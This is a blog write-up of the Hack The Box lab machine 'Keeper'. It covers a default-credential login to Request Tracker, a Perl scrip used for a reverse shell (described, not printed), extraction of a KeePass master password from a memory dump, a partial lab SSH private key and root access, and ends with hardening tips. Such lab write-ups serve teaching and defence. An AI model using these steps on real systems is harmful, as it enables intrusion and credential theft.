<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="stylesheet" href="https://mvineza.github.io/spindel/assets/css/syntax.css"><link rel="preconnect" href="https://cdnjs.cloudflare.com"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><title> Hack The Box - Keeper - Spindel</title><link rel="shortcut icon" href="https://mvineza.github.io/spindel/favicon.png"><link rel="alternate" type="application/atom+xml" title="Spindel" href="https://mvineza.github.io/spindel/atom.xml"><link rel="alternate" type="application/json" title="Spindel" href="https://mvineza.github.io/spindel/feed.json" /><link rel="sitemap" type="application/xml" title="sitemap" href="https://mvineza.github.io/spindel/sitemap.xml" /><style> *,:after,:before{box-sizing:border-box;background-color:inherit;color:inherit;margin:0;padding:0}html{font-size:17px}#theme-toggle{opacity:0.65;position:relative;border-radius:5px;height:25px;display:flex;-webkit-box-align:center;align-items:center;-webkit-box-pack:center;justify-content:center;transition:opacity 0.3s ease 0s;border:none;outline:none;background:none;cursor:pointer;padding:0px;appearance:none;transform:scale(0.8)}html,html[data-theme="light"]{--text-font: PT Sans;--source-code-font: Cousine;--very-light-text-color: rgb(222, 222, 222);--light-text-color: rgb(89, 183, 255);--medium-text-color: #555;--main-text-color: #333;--highlight-text-color: #6cb4a0;--dark-text-color: #393e46;--link-color: rgb(50, 87, 209);--code-bg-color: rgb(245, 245, 245);background-color:#fff}html #theme-toggle div,html[data-theme="light"] #theme-toggle div{position:relative;width:24px;height:24px;border-radius:50%;border:none;background-color:var(--theme-ui-colors-transparent, transparent);transform:scale(1);transition:all 0.45s ease 0s;overflow:hidden;box-shadow:inset 8px -8px 0px 0px var(--theme-ui-colors-toggleIcon, #2d3748)}html #theme-toggle div::before,html[data-theme="light"] #theme-toggle div::before{content:"";position:absolute;right:-9px;top:-9px;height:24px;width:24px;border:none;border-radius:50%;transform:translate(0px, 0px);opacity:1;transition:transform 0.45s ease 0s}html #theme-toggle div::after,html[data-theme="light"] #theme-toggle div::after{content:"";width:8px;height:8px;border-radius:50%;margin:-4px 0px 0px -4px;position:absolute;top:50%;left:50%;box-shadow:0 -23px 0 var(--theme-ui-colors-toggleIcon, #2d3748),0 23px 0 var(--theme-ui-colors-toggleIcon, #2d3748),23px 0 0 var(--theme-ui-colors-toggleIcon, #2d3748),-23px 0 0 var(--theme-ui-colors-toggleIcon, #2d3748),15px 15px 0 var(--theme-ui-colors-toggleIcon, #2d3748),-15px 15px 0 var(--theme-ui-colors-toggleIcon, #2d3748),15px -15px 0 var(--theme-ui-colors-toggleIcon, #2d3748),-15px -15px 0 var(--theme-ui-colors-toggleIcon, #2d3748);transform:scale(0);transition:all 0.35s ease 0s}html[data-theme="dark"]{--text-font: PT Sans;--source-code-font: Cousine;--very-light-text-color: #EEE;--light-text-color: #c4bbf0;--medium-text-color: #52057b;--main-text-color: #EAEAEA;--highlight-text-color: #6cb4a0;--dark-text-color: rgb(36, 38, 42);--link-color: rgb(255, 89, 125);--code-bg-color: rgb(36, 38, 42);background-color:#131418}html[data-theme="dark"] #theme-toggle div{position:relative;width:24px;height:24px;border-radius:50%;border:4px solid var(--theme-ui-colors-toggleIcon, #cbd5e0);background-color:var(--theme-ui-colors-toggleIcon, #cbd5e0);transform:scale(0.55);transition:all 0.45s ease 0s;overflow:visible;box-shadow:none}html[data-theme="dark"] #theme-toggle div::before{content:"";position:absolute;right:-9px;top:-9px;height:24px;width:24px;border:2px solid var(--theme-ui-colors-toggleIcon, #cbd5e0);border-radius:50%;transform:translate(14px, -14px);opacity:0;transition:transform 0.45s ease 0s}html[data-theme="dark"] #theme-toggle div::after{content:"";width:8px;height:8px;border-radius:50%;margin:-4px 0px 0px -4px;position:absolute;top:50%;left:50%;box-shadow:0 -23px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),0 23px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),23px 0 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),-23px 0 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),15px 15px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),-15px 15px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),15px -15px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),-15px -15px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0);transform:scale(1);transition:all 0.35s ease 0s}body{font-family:var(--text-font),"PT Sans",sans-serif;text-rendering:optimizeLegibility;line-height:1.75;color:var(--main-text-color)}a{color:var(--link-color);text-decoration:none}.post p{margin:1rem 0}.meta{margin:1.4rem 0}code,pre{background:var(--code-bg-color);margin:0 -27px;border-width:1px}code{font-family:var(--source-code-font),monospace;font-size:13px;margin:unset;padding:0.1rem;color:var(--highlight-text-color)}pre code{background-color:unset;color:unset;white-space:pre;overflow-x:scroll;overflow-y:hidden;display:block}pre{border-width:3px;padding:0.8rem;white-space:pre-wrap;border-style:none none none solid;border-color:var(--light-text-color)}img{max-width:100%}hr{background:var(--light-text-color);height:1px;border:0}header{flex-basis:10rem;flex-grow:1;position:relative}header a{text-decoration:none}header li{margin-bottom:0.2rem;text-align:right;margin-right:2rem}header a.active{font-weight:bold}header,section{padding:1rem 0}section{margin-top:5.5rem}blockquote{font-style:italic;border-left:5px solid var(--dark-text-color);padding-left:1rem}h1{color:var(--main-text-color);text-transform:uppercase;font-size:2rem;font-weight:bold;margin-bottom:1.0rem;margin-top:1.0rem}h2,h3,h4,h5{font-weight:bold;margin-bottom:1.5rem;font-size:2rem}h2{font-size:1.8rem;margin-top:1.0rem;margin-bottom:1.0rem}h3{font-size:1.6rem}h4{font-size:1.4rem}h5{font-size:1.2rem}h6{font-size:1rem}section h1:first-child{margin-top:0}strong,b{font-weight:bold}.photos ul{list-style:none}.photos li{margin-bottom:1.5rem}.photo picture,.project picture{margin-bottom:0.5rem}.posts>h3{font-weight:500}.post ul{margin:0px;margin:0px 0px 10px 10px}.post ol{margin:0px;margin:0px 0px 10px 15px}.posts li{align-items:center;display:flex;justify-content:space-between;margin-bottom:0.5rem}.posts li a,.posts li div,.projects li a{white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-weight:bold}.posts li time,.projects li time{padding-left:1rem;white-space:nowrap;font-variant-numeric:tabular-nums}time{color:var(--main-text-color)}.post>h1.title{font-size:x-large;margin-top:0;margin-bottom:0}.post>time{margin-bottom:0;margin-top:3rem}.highlight{margin:0px}main{display:flex;max-width:47rem;margin:-5rem auto 0;padding:2.4rem 2rem;flex-direction:column}.flex-row-between{display:flex;flex-direction:row;justify-content:space-between}.social-footer{padding:1rem;display:flex;justify-content:center;position:initial}.social-footer .social-footer-icons .fa{font-size:1.3rem;color:#a9a9a9}.social-footer .social-footer-icons .fa:hover{color:dimgray;transition:color 0.3s ease-in}@media screen and (max-width: 45rem){header li{display:inline;margin-right:1rem}.logo{padding-bottom:1rem}header ul{border-bottom:1px solid #edf2f7;padding-bottom:2rem}nav ul{border-right:0px}.photos ul{margin-top:0.5rem}main{padding:0 2rem}}section{flex-grow:999;display:flex;flex-direction:column}figcaption{font-size:smaller}.bio{margin-bottom:5rem}::selection{background-color:#fffba0;color:#333}.search-article{position:relative}.search-article label[for="search-input"]{position:relative;top:-10px;left:11px}.search-article input[type="search"]{top:-1rem;left:0;border:0;width:100%;height:30px;outline:none;position:absolute;border-radius:5px;padding:10px 10px 10px 35px;color:var(--main-text-color);-webkit-appearance:none;background-color:rgba(128,128,128,0.1);border:1px solid rgba(128,128,128,0.1)}.search-article input[type="search"]::-webkit-input-placeholder{color:#808080}.search-article input[type="search"]::-webkit-search-decoration,.search-article input[type="search"]::-webkit-search-results-decoration{display:none}#search-results{text-align:center}#search-results li{text-align:center}#search-results li::before{content:"›";display:inline-block;margin-left:-1.3em;width:1.3em;color:var(--main-text-color)}.post-nav{display:flex;position:relative;margin-top:0;border-top:2px solid var(--light-text-color);line-height:1.4}.post-nav .post-nav-item{border-bottom:0;padding-bottom:10px;width:50%;padding-top:10px;text-decoration:none;box-sizing:border-box}.post-nav .post-nav-item .post-title{color:var(--main-text-color)}.post-nav .post-nav-item:hover .post-title,.post-nav .post-nav-item:focus .post-title{color:var(--link-color);opacity:0.9}.post-nav .post-nav-item .nav-arrow{font-size:17px;color:var(--main-text-color);margin-bottom:3px;font-weight:bold}.post-nav .post-nav-item:nth-child(odd){padding-left:0;padding-right:20px}.post-nav .post-nav-item:nth-child(even){text-align:right;padding-right:0;padding-left:20px}.tags ul{list-style:none;display:grid;grid-template-columns:auto auto auto auto auto auto;grid-template-rows:auto auto auto auto}.tags li{white-space:normal;text-overflow:ellipsis}.timeline{position:center;width:650px;margin:-6em auto;padding:1px;list-style-type:none}@media (max-width: 860px){.timeline{width:100%}}.timeline:before{position:absolute;left:50%;top:0;content:' ';display:block;width:6px;height:170%;margin-left:-3px;background:var(--light-text-color);z-index:5}@media (max-width: 375px){.timeline:before{height:150%}}.timeline li{padding:2em 0}@media (max-width: 860px){.timeline li{padding:2em 0}}.timeline li::after{content:"";display:block;clear:both;visibility:hidden}.direction-l{position:relative;width:287px;float:left;text-align:right}@media (max-width: 860px){.direction-l{float:none;width:100%;text-align:center}}.direction-l .flag{color:#333;box-shadow:-1px 1px 1px rgba(0,0,0,0.52)}.direction-l .flag:after{content:"";position:absolute;left:100%;top:50%;height:0;width:0;margin-top:-8px;border:solid transparent;border-left-color:#f8f8f8;border-width:8px;pointer-events:none}@media (max-width: 860px){.direction-l .flag:after{content:"";position:absolute;left:50%;top:-8px;height:0;width:0;margin-left:-8px;border:solid transparent;border-bottom-color:#fff;border-width:8px;pointer-events:none}}.direction-l .time-wrapper{float:left}@media (max-width: 860px){.direction-l .time-wrapper{float:none}}.direction-r{position:relative;width:293px;float:right;text-align:left}@media (max-width: 860px){.direction-r{float:none;width:100%;text-align:center}}.direction-r .flag{color:#333;box-shadow:1px 1px 1px rgba(0,0,0,0.52)}.direction-r .flag:after{content:"";position:absolute;right:100%;top:50%;height:0;width:0;margin-top:-8px;border:solid transparent;border-right-color:#f8f8f8;border-width:8px;pointer-events:none}@media (max-width: 860px){.direction-r .flag:after{content:"";position:absolute;left:50%;top:-8px;height:0;width:0;margin-left:-8px;border:solid transparent;border-bottom-color:#fff;border-width:8px;pointer-events:none}}.direction-r .flag:before{left:-45px}.direction-r .time-wrapper{float:right}@media (max-width: 860px){.direction-r .time-wrapper{float:none}}.flag-wrapper{position:relative;display:inline-block;text-align:center}@media (max-width: 860px){.flag-wrapper{text-align:center}}.flag-wrapper .flag{position:relative;display:inline;background:#f8f8f8;padding:6px 10px;border-radius:5px;font-weight:600;text-align:left}@media (max-width: 860px){.flag-wrapper .flag{background:#fff;z-index:15}}.direction-l .flag:before,.direction-r .flag:before{position:absolute;top:60%;right:-40px;content:' ';display:block;width:12px;height:12px;margin-top:-10px;background:#fff;border-radius:10px;border:4px solid var(--link-color);z-index:10}@media (max-width: 860px){.direction-l .flag:before,.direction-r .flag:before{position:absolute;top:-30px;left:53%;content:' ';display:block;margin-left:-10px}}.time-wrapper{display:inline;line-height:1em;font-size:0.66666em;color:var(--link-color);vertical-align:middle}@media (max-width: 860px){.time-wrapper{display:block;position:relative;margin:4px 0 0 0;z-index:14}}.time-wrapper .time{display:inline-block;padding:4px 6px;background:#f8f8f8}.desc{margin:1em 0.2em -3.5em 0;font-size:0.9em;line-height:1.5em}.desc a{color:var(--link-color);text-decoration:none}.desc a:hover{text-decoration:underline}@media (max-width: 860px){.desc{position:relative;margin:1em 1em 0 1em;padding:1em;background:var(--code-bg-color);box-shadow:0 0 1px rgba(0,0,0,0.2);z-index:15}}</style></head><script async src="https://www.googletagmanager.com/gtag/js?id=G-3EP7KLCYVP"></script> <script> window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'G-3EP7KLCYVP'); </script><body><main><section class="post"><div class="flex-row-between"> <a href="https://mvineza.github.io/spindel/">« back</a> <button title="Change theme" id="theme-toggle" onclick="modeSwitcher()"><div></div></button></div><time datetime="2023-12-25T00:00:00+08:00">Dec 25, 2023 - 3 ' read</time><h1 class="title"> Hack The Box - Keeper</h1><span class="meta"> <a href="https://mvineza.github.io/spindel/tag/htb">htb</a>, <a href="https://mvineza.github.io/spindel/tag/keepass">keepass</a>, <a href="https://mvineza.github.io/spindel/tag/rt">rt</a></span><h2 id="box-info"> Box Info <a href="#box-info">#</a></h2><p><img src="/spindel/assets/Hack%20The%20Box%20-%20Keeper/4deb4eb2b5b8b43b969f0cecda095d5b.png" alt="" /></p><p>Rating/Difficulty: easy</p><h2 id="recon"> Recon <a href="#recon">#</a></h2><h3 id="nmap-tcp"> Nmap (TCP) <a href="#nmap-tcp">#</a></h3><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.94 scan initiated Sat Dec 23 10:48:29 2023 as: nmap -p- -sC -O -sV --min-rate=10000 -oN nmap.txt keeper</span>
Nmap scan report <span class="k">for </span>keeper <span class="o">(</span>10.10.11.227<span class="o">)</span>
Host is up <span class="o">(</span>0.035s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=12/23%OT=22%CT=1%CU=39778%PV=Y%DS=2%DC=I%G=Y%TM=658604
OS:4D%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST
OS:11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Dec 23 10:49:01 2023 -- 1 IP address (1 host up) scanned in 31.89 seconds
</span></code></pre></div></div><h2 id="foothold"> Foothold <a href="#foothold">#</a></h2><p>The box is running <a href="https://github.com/bestpractical/rt">request tracker</a> app which I was able to login using default admin credentials of <code class="language-plaintext highlighter-rouge">root:password</code>.</p><p><img src="/spindel/assets/Hack%20The%20Box%20-%20Keeper/47389625bff13b1d3522417f525349a0.png" alt="" /></p><p>Ticketing systems normally have some scripting functionalities so I looked around and I found that it can <a href="https://docs.bestpractical.com/rt/4.4.3/customizing/scrip_conditions_and_action.html">execute perl scripts </a>on a certain condition.</p><p><img src="/spindel/assets/Hack%20The%20Box%20-%20Keeper/4de0a403ce25bd7bd5edb3310271c3cd.png" alt="" /></p><p>Since I’m an admin, I created my own script and used a perl function to ping my attacker IP whenever a ticket is created.</p><p><img src="/spindel/assets/Hack%20The%20Box%20-%20Keeper/db52f08db844d5652fac1d7e5f0f79c1.png" alt="" /></p><p><img src="/spindel/assets/Hack%20The%20Box%20-%20Keeper/8740d21e1e883f939924413906ebd3ea.png" alt="" /></p><p>After creating that script, I created a ticket and after a few seconds I received a ping request. I modified my payload to a reverse shell command which gave me foothold to the box as <code class="language-plaintext highlighter-rouge">www-data</code>.</p><h2 id="privilege-escalation"> Privilege Escalation <a href="#privilege-escalation">#</a></h2><p>Doing a quick look around the home directories, I found this interesting ZIP file.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/lnorgaard/RT30000.zip
</code></pre></div></div><p>I copied it to my attacker box and I found Keepass memory dump and DB file.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  loot file KeePassDumpFull.dmp                              
KeePassDumpFull.dmp: Mini DuMP crash report, 16 streams, Fri May 19 13:46:21 2023, 0x1806 <span class="nb">type</span>
➜  loot file passcodes.kdbx                   
passcodes.kdbx: Keepass password database 2.x KDBX
➜  loot 
</code></pre></div></div><p>Knowing that the box’ name is <code class="language-plaintext highlighter-rouge">keeper</code>, I looked around some keepass vulnerabilities and exploits and I found this <a href="https://dev.to/tutorialboy/keepass-memory-leakage-vulnerability-analysis-cve-2023-32784-17nf">blog</a>.</p><p>It allows anyone to extract majority of the master password characters from a memory dump due to the fact that keepass versions before 2.54 uses a managed string to store the characters of the master password.</p><p>On that blog, there is this <a href="https://github.com/vdohney/keepass-password-dumper">tool</a> that was reference. It can automate the password extraction so I ran it.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  keepass-password-dumper git:<span class="o">(</span>main<span class="o">)</span> ✗ ~/.dotnet/dotnet run ../../loot/KeePassDumpFull.dmp
Found: ●ø
Found: ●ø
<span class="c"># ...</span>
Password candidates <span class="o">(</span>character positions<span class="o">)</span>:
Unknown characters are displayed as <span class="s2">"●"</span>
1.:	●
2.:	ø, Ï, ,, l, <span class="sb">`</span>, -, <span class="s1">', ], §, A, I, :, =, _, c, M, 
3.:	d, 
4.:	g, 
5.:	r, 
6.:	ø, 
7.:	d, 
8.:	 , 
9.:	m, 
10.:	e, 
11.:	d, 
12.:	 , 
13.:	f, 
14.:	l, 
15.:	ø, 
16.:	d, 
17.:	e, 
Combined: ●{ø, Ï, ,, l, `, -, '</span>, <span class="o">]</span>, §, A, I, :, <span class="o">=</span>, _, c, M<span class="o">}</span>dgrød med fløde
➜  keepass-password-dumper git:<span class="o">(</span>main<span class="o">)</span> ✗ 
</code></pre></div></div><p>Even using the tool, I still can’t figure out the password. It’s odd that there is a space on the master password and an unusual character <code class="language-plaintext highlighter-rouge">ø</code> . I looked around in Google about that generated string and I found this.</p><p><img src="/spindel/assets/Hack%20The%20Box%20-%20Keeper/0a48ed521bc8cc067b4e46c53b9d50bf.png" alt="" /></p><p>Translating it to english results to this which looks like a type of dessert.</p><p><img src="/spindel/assets/Hack%20The%20Box%20-%20Keeper/8744e1e9b0ee55a9530220ba55770758.png" alt="" /></p><p>I opened keepass database file and tried to use <code class="language-plaintext highlighter-rouge">Rødgrød med fløde</code> but it keeps crashing with this error.</p><p><img src="/spindel/assets/Hack%20The%20Box%20-%20Keeper/76b00dccb05045960ddbecc5bb92acbe.png" alt="" /></p><p>I tried pasting any random password without that special character and it worked fine so it looked like the linux keepass version I’m using is not happy with the special character.</p><p>So I opened up a windows VM and used a native keepass. I was able to found that the password is <code class="language-plaintext highlighter-rouge">rødgrød med fløde</code> instead of <code class="language-plaintext highlighter-rouge">Rødgrød med fløde</code>.</p><p><img src="/spindel/assets/Hack%20The%20Box%20-%20Keeper/47e049cf23a48585b4e7b06321cb6734.png" alt="" /></p><p>There is a private key in putty format inside the root credential.</p><p><img src="/spindel/assets/Hack%20The%20Box%20-%20Keeper/7517df4d9dab3bbc20774562498a4395.png" alt="" /></p><p>This may be the root SSH privatekey so I downloaded puttygen and <a href="https://upsource-support.jetbrains.com/hc/en-us/articles/206545529-Converting-PuTTY-private-keys-to-OpenSSH-format">converted it into an openssh private key </a>format.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAp1arHv4TLMBgUULD7AvxMMsSb3PFqbpfw/K4gmVd9GW3xBdP
c9DzVJ+A4rHrCgeMdSrah9JfLz7UUYhM7AW5/pgqQSxwUPvNUxB03NwockWMZPPf
Tykkqig8VE2XhSeBQQF6iMaCXaSxyDL4e2ciTQMt+JX3BQvizAo/3OrUGtiGhX6n
FSftm50elK1FUQeLYZiXGtvSQKtqfQZHQxrIh/BfHmpyAQNU7hVW1Ldgnp0lDw1A
MO8CC+eqgtvMOqv6oZtixjsV7qevizo8RjTbQNsyd/D9RU32UC8RVU1lCk/LvI7p
5y5NJH5zOPmyfIOzFy6m67bIK+csBegnMbNBLQIDAQABAoIBAQCB0dgBvETt8/UF
...
</code></pre></div></div><p>As confirmed, this private key gave me root access to the box.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Last login: Sat Dec 23 23:51:24 2023 from 10.10.14.62
root@keeper:~# <span class="nb">hostname
</span>keeper
root@keeper:~# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@keeper:~# 
</code></pre></div></div><h2 id="post-analysis"> Post Analysis <a href="#post-analysis">#</a></h2><h3 id="rt-redirect-credentials"> RT redirect: credentials <a href="#rt-redirect-credentials">#</a></h3><p>I notice when I go directly to <code class="language-plaintext highlighter-rouge">http://tickets.keeper.htb</code> the default admin credentials doesn’t work.</p><p><img src="/spindel/assets/Hack%20The%20Box%20-%20Keeper/c1646c6887e53e6e03ce48704f04f924.png" alt="" /></p><p>It only works when I go first to the IP, then click the redirection link.</p><p><img src="/spindel/assets/Hack%20The%20Box%20-%20Keeper/447dc8cad530dfb330e3f22a3427df37.png" alt="" /></p><p><img src="/spindel/assets/Hack%20The%20Box%20-%20Keeper/181cda4bd86fee3c7b5aa2613073eab5.png" alt="" /></p><p>Comparing the first and second request, I notice the referrer on the first has <code class="language-plaintext highlighter-rouge">/rt/</code>. That mostly likely means the proper endpoint to access is <code class="language-plaintext highlighter-rouge">/rt/</code>.</p><p><img src="/spindel/assets/Hack%20The%20Box%20-%20Keeper/30d6944065ff854716ce66a9ccd7aa80.png" alt="" /></p><p>I confirmed the credentials worked when I added <code class="language-plaintext highlighter-rouge">/rt/</code>.</p><p>Without digging further, it looks like the CGI scripts are loaded on that endpoint as per the nginx config.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@keeper:/etc/nginx# <span class="nb">cat </span>sites-enabled/irt  | <span class="nb">grep</span> /rt
            fastcgi_param  SCRIPT_NAME        <span class="s2">"/rt"</span><span class="p">;</span>
root@keeper:/etc/nginx# 
</code></pre></div></div><p>So when I removed it from the endpoint, the CGI scripts handling the authentication didn’t worked properly.</p><h3 id="rt-redirect-burp"> RT redirect: burp <a href="#rt-redirect-burp">#</a></h3><p>When doing actions inside the app, most of the time I see this warning.</p><p><img src="/spindel/assets/Hack%20The%20Box%20-%20Keeper/8e8a43a00be2d4116aa069b26af233c5.png" alt="" /></p><p>If I choose to resume, the request failed because it goes to <code class="language-plaintext highlighter-rouge">http://keeper.htb</code> instead of <code class="language-plaintext highlighter-rouge">http://tickets.keeper.htb</code>.</p><p><img src="/spindel/assets/Hack%20The%20Box%20-%20Keeper/f68ba58764fcac2ba25a8801b38bfebe.png" alt="" /></p><p>As a quick fix, I used burp’s match and replace rules to dynamically convert the host headers to <code class="language-plaintext highlighter-rouge">http://tickets.keeper.htb</code>.</p><p><img src="/spindel/assets/Hack%20The%20Box%20-%20Keeper/0f9f10d14218dea7109420af591b238e.png" alt="" /></p><h3 id="easier-foothold-method"> Easier foothold method <a href="#easier-foothold-method">#</a></h3><p>After doing the box, I looked at other peoples’ solution and I found out that the foothold is indeed way easier than the path I took (reverse shell).</p><p>If I look at the user settings, I can see that user <code class="language-plaintext highlighter-rouge">lnorgaard</code>’s SSH credential is on the comment.</p><p><img src="/spindel/assets/Hack%20The%20Box%20-%20Keeper/5592777b80f44c6cc328a94d52bf363d.png" alt="" /></p><p>I think my enumeration skills become rusty after not doing CTF for a long time.</p><h3 id="keepass-dump-cron"> Keepass dump cron <a href="#keepass-dump-cron">#</a></h3><p>I looked around how the keepass dump file is generated and I saw this root cron that copies a static file to <code class="language-plaintext highlighter-rouge">lnorgaard</code>’s home directory.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>/2 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> /usr/bin/cp /root/RT30000.zip /home/lnorgaard/
</code></pre></div></div><p>I thought there is a real keepass app that is running in the background and some script that scrapes <code class="language-plaintext highlighter-rouge">/proc</code> to get the dump but there isn’t.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@keeper:/etc/nginx# dpkg <span class="nt">-l</span> | <span class="nb">grep</span> <span class="nt">-i</span> keepass
root@keeper:/etc/nginx# ps <span class="nt">-ef</span> | <span class="nb">grep</span> <span class="nt">-i</span> keepa | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nb">grep
</span>root@keeper:/etc/nginx# 
</code></pre></div></div><h2 id="hardening"> Hardening <a href="#hardening">#</a></h2><ul><li>Don’t put default credentials on user comments in RT. Make sure also to change the SSH creds as it is easy to brute force.</li><li>Upgrade keepass to <code class="language-plaintext highlighter-rouge">2.54</code>.</li></ul></section><section><nav class="post-nav"> <a class="post-nav-item post-nav-prev" href="/spindel/2022/07/09/inspecting-javascript-codes"><div class="nav-arrow">Previous</div><span class="post-title">Inspecting Javascript Codes</span> </a></nav></section><div id="disqus_thread" class="article-comments"></div><script> (function() { var d = document, s = d.createElement('script'); s.src = '//powex.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); </script> <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></main><script> function setTheme(theme) { if (theme === "dark") { document.documentElement.setAttribute('data-theme', 'dark'); window.localStorage.setItem('theme', 'dark'); document.getElementById("theme-toggle").classList.add('sun'); document.getElementById("theme-toggle").classList.remove('moon'); } else { document.documentElement.setAttribute('data-theme', 'light'); window.localStorage.setItem('theme', 'light'); document.getElementById("theme-toggle").classList.add('moon'); document.getElementById("theme-toggle").classList.remove('sun'); } } let theme = localStorage.getItem('theme'); theme = theme || (window.matchMedia ? window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light' : 'light'); setTheme(theme); function modeSwitcher() { let currentMode = document.documentElement.getAttribute('data-theme'); if (currentMode === "dark") { setTheme('light'); } else { setTheme('dark'); } } </script></body><footer class="social-footer"><div class="social-footer-icons"> <a href="https://github.com/mvineza" title="Github profile, nothing much there, yet" target="_blank" rel="noopener noreferrer"><i class="fa fa-github" aria-hidden="true"></i></a> <a href="https://mvineza.github.io/spindel/atom.xml" title="Feed RSS" target="_blank" rel="noopener noreferrer"><i class="fa fa-rss" aria-hidden="true"></i></a> <a href="https://github.com/mvineza/spindel" title="Browse the code" target="_blank" rel="noopener noreferrer"><i class="fa fa-code" aria-hidden="true"></i></a></div></footer></html>
